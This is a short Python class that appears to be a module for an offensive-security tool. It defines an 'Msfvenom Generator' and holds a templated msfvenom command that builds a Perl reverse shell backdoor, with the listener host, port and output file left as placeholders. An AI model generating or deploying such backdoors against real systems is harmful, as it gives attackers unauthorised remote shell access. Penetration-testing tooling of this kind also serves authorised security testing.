class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse shell backdoor into a perl file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p cmd/unix/reverse_perl lhost="TARGET" lport=PORT -f raw > FILE_PATH.pl'
